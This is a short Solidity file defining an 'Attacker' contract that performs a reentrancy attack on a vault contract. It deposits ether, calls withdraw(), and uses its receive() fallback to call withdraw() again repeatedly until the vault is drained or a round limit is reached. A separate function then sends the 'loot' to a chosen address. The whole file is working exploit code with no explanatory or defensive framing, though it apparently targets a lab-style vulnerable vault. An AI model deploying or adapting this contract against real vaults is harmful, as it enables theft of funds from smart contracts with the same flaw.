// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableVault public immutable vault;
    address public immutable owner;

    uint256 public rounds;
    uint256 public immutable maxRounds;

    constructor(address vaultAddress, uint256 roundLimit) {
        vault = IVulnerableVault(vaultAddress);
        owner = msg.sender;
        maxRounds = roundLimit;
    }

    function attack() external payable {
        require(msg.sender == owner, "Attacker: not owner");
        require(msg.value > 0, "Attacker: no value");

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (
            address(vault).balance >= msg.value &&
            rounds < maxRounds
        ) {
            rounds += 1;
            vault.withdraw();
        }
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdrawLoot(address payable recipient) external {
        require(msg.sender == owner, "Attacker: not owner");
        recipient.transfer(address(this).balance);
    }
}
